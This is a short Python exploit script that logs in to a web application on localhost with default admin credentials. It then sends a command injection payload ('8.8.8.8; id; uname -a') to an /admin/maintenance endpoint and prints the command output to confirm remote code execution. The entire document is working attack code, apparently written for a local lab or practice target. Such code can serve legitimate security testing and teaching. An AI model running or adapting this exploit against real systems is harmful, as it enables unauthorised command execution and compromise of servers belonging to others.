import requests

TARGET = "http://localhost:8080/admin/maintenance"

def exploit_rce():
    print("[*] Exploiting Command Injection on /admin/maintenance...")
    command = "8.8.8.8; id; uname -a"
    
    session = requests.Session()
    print("[*] Logging in to get session...")
    session.post("http://localhost:8080/login", data={"username": "admin", "password": "admin123"})
    
    try:
        response = session.post(TARGET, data={"target": command, "tool": "check"})
        if "uid=" in response.text:
            print("[+] Success! RCE obtained.")
            print("[*] Command Output:")
            if "<pre>" in response.text:
                output = response.text.split("<pre>")[1].split("</pre>")[0]
                print(output.strip())
            else:
                print("[!] Success but output not found in <pre> tags.")
        else:
            print("[-] RCE failed.")
    except Exception as e:
        print(f"[-] Connection Error: {e}")

if __name__ == "__main__":
    exploit_rce()
